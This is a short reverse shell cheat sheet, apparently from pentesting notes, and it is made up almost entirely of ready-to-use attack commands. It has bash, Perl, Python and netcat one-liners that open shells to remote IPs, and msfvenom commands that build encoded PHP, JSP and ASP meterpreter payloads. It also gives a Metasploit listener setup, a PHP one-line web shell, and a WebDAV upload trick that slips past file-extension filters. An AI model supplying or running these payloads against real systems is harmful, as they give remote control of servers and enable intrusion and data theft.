### Shell example

#### Reverse Shell Cheat Sheat

PHP Reverse Shell
```
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -e php/base64 -f raw > shell.php
```
Karşılaması

```
msf> use exploit/multi/handler
set payload php/reverse_php
set lhost 10.10.10.10
exploit
```

##### BASH

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

##### PERL

perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

##### PYTHON

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

##### NETCAT

nc -e /bin/sh 10.0.0.1 1234

##### PHP PentestMonkey

http://pentestmonkey.net/tools/web-shells/php-reverse-shell
```
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

##### PHP Windows-reverse-shell
https://github.com/Dhayalanb/windows-php-reverse-shell

##### PHP One Line Shell
```
<?php
shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.11.0.52/4444 0>&1'");
?>
```

##### JSP PAYLOAD TOMCAT
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.52 LPORT=443 -f war > shell-209.war
```

##### ASP Shell @Txt bypass
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.52 LPORT=443 -f asp -e x86/shikata_ga_nai -i 3 > 52.txt
cadaver http://10.11.1.229
curl -X MOVE --header "Destination:http://10.11.1.229/52.asp;.txt" "http://10.11.1.229/52.txt"
```

 
